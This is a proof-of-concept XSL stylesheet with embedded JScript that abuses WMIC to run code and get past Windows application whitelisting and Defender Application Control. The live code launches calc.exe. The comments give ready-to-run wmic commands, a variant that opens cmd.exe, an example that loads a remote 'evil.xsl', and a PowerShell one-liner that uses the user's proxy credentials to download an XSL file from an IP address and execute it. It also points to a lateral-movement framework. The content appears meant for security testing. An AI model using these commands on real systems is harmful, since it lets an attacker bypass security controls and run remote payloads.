<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]> </ms:script>
</stylesheet>

<!--
MODIFIED VERSION TO SUITE TESTING ONLY.

Original publication:
https://subt0x11.blogspot.lu/2018/04/wmicexe-whitelisting-bypass-hacking.html

Microsoft documentation:
https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script

Use-case/main objective:
- Windows Script Host is disabled or blocked
unconstrained script host bypass for Windows Defender Application Control 
WMIC can invoke XSL (eXtensible Stylesheet Language) scripts, either locally or from a URL.

Proof of concept based on C:\Windows\System32\wbem\texttable.xsl

PoC examples:
wmic process LIST /FORMAT:"C:\Users\WMI\poc-wmic.xsl"

OR:
wmic process get brief /format:"C:\Users\WMI\poc-wmic.xsl" 
wmic process LIST /FORMAT:"\\127.0.0.1\c$\Users\WMI\poc-wmic.xsl"

#cat poc-wmic.xsl:
                  <?xml version='1.0'?>
                    <stylesheet
                    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
                    xmlns:user="placeholder"
                    version="1.0">
                      <output method="text"/>
                        <ms:script implements-prefix="user" language="JScript">
                          <![CDATA[
                            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k echo 'Tapz!'");
                          ]]> </ms:script>
                  </stylesheet>


Remote File example:
wmic os get /FORMAT:"https://example.com/evil.xsl"

Basic PoC payload using Powershell oneliner + proxy authentication (from IE config.):
PS C:\Users\pwnd\Desktop> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('192.168.13.37/test2.xsl') -outfile test2.xsl";$cmd="wmic os get /format:'test2.xsl'"; iex $cmd

Post-exploit Project that already implement this king of lateral movement:
https://github.com/zerosum0x0/koadic
-->
